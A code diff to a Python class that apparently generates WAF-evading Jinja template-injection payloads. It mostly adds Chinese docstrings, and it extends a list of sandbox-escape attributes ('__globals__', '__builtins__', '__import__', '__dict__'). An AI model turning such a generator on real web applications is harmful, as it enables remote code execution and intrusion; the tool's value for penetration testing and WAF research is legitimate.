@@ -11,8 +11,6 @@ from . import payload_gen
 from .colorize import colored
 from .context_vars import (
     context_payloads_all,
-    filter_by_used_context,
-    filter_by_waf,
     ContextVariableUtil,
 )
 from .const import (
@@ -87,6 +85,11 @@ class FullPayloadGen:
     payload由两部分组成：
         - 前方提供变量等上下文的上下文payload（一般为{%set xxx=xxx%}的形式）
         - 以及后方实际发挥作用的作用payload（一般被双花括号{{}}包裹）
+    这个对象主要管理两个子对象的状态：
+    - payload_gen: 表达式生成器，负责生成`"ls"" /"`等表达式
+    - context_vars: 上下文变量管理器
+        - 其中包含多个形如`{%set xxxx%}`的payload、他们对应的变量以及payload依赖的变量
+        - 其可以产生一个context字典（包含其中所有变量的名字和值），这个字典需要被传给payload_gen
     """
 
     def __init__(
@@ -139,7 +142,11 @@ class FullPayloadGen:
             self.payload_gen.callback = callback
 
     def do_prepare(self) -> bool:
-        """准备作用payload的最外层（一般为双花括号{{}}），过滤所有可用的payload
+        """为生成最后的payload准备一系列值
+        - 准备作用payload的最外层（一般为双花括号{{}}）
+        - 过滤所有可用的payload，在所有形如`{%set xxx%}`的payload中找出可以通过WAF的payload
+        - 事先生成一系列字符串的表达式并使用set设置
+        - 基于上面的内容产生payload_gen实例
 
         Returns:
             bool: 是否生成成功，失败则无法生成payload。
@@ -181,9 +188,13 @@ class FullPayloadGen:
         return True
 
     def prepare_extra_context_vars(self):
+        """生成一系列字符串的变量并加入到context payloads中
+        """
         targets = [
             "__class__",
             "__globals__",
+            "__init__",
+            "__dict__",
             "__builtins__",
             "__getitem__",
             "__import__",
@@ -218,7 +229,7 @@ class FullPayloadGen:
             if ret is None:
                 continue
             expression, used_context, _ = ret
-            # get a valid variable name
+            # 变量名需要可以通过waf且不重复
             var_name = None
             for _ in range(10):
                 name = "".join(random.choices(string.ascii_lowercase, k=4))
@@ -229,7 +240,7 @@ class FullPayloadGen:
                 var_name = name
             if not var_name:
                 continue
-            # add payload
+            # 保存payload、对应的变量以及payload依赖的变量
             payload = "{%set NAME=EXPR%}".replace("NAME", name).replace(
                 "EXPR", expression
             )
@@ -237,15 +248,14 @@ class FullPayloadGen:
                 payload, {name: target}, check_waf=True, depends_on=used_context
             )
             if not success:
-                logger.info("Failed generating %s", colored("yellow", repr(target)))
+                logger.info("Failed generating %s, continue", colored("yellow", repr(target)))
                 continue
-            # add used context
-            # finish
             logger.info(
                 "Adding %s with %s",
                 colored("yellow", repr(target)),
                 colored("blue", payload),
             )
+        # 需要清除缓存，否则生成器只会使用缓存的表达式而不会使用加入的变量
         self.payload_gen.cache_by_repr.clear()
 
     def add_context_variable(
@@ -255,6 +265,20 @@ class FullPayloadGen:
         check_waf: bool = True,
         depends_on: Union[Dict[str, Any], None] = None,
     ) -> bool:
+        """将上下文变量以及其的payload加入到payload_gen和context_vars中
+
+        Args:
+            payload (str): 上下文变量的payload
+            context_vars (Dict[str, Any]): payload对应的上下文变量
+            check_waf (bool, optional): 是否检查payload可以通过WAF. Defaults to True.
+            depends_on (Union[Dict[str, Any], None], optional): payload依赖的变量. Defaults to None.
+
+        Raises:
+            RuntimeError: 没有事先调用.do_prepare()则抛出错误
+
+        Returns:
+            bool: 是否添加成功，如果WAF检测失败或者变量重名则添加失败
+        """
         if not self.prepared:
             raise RuntimeError("Please run .do_prepare() first")
         success = self.context_vars.add_payload(
@@ -280,13 +304,17 @@ class FullPayloadGen:
             Tuple[Union[str, None], Union[bool, None]]:
                 payload, 以及payload是否会有回显
         """
+        # 需要准备context payload和表达式外部的包裹，然后使用assert检查是否正确
         if not self.prepared and not self.do_prepare():
             return None
         assert self.payload_gen is not None, "when prepared, we should have payload_gen"
+        assert isinstance(self.outer_pattern, str)
 
+        # 添加一系列值为字符串的变量
         self.prepare_extra_context_vars()
         logger.info("Start generating final expression...")
 
+        # 生成并检查
         ret = self.payload_gen.generate_detailed(gen_type, *args)
 
         if ret is None:
@@ -294,8 +322,8 @@ class FullPayloadGen:
             return None
         inner_payload, used_context, tree = ret
         context_payload = self.context_vars.get_payload(used_context)
-        assert isinstance(self.outer_pattern, str)
 
+        # 产生最终的payload
         payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
 
         self.callback(
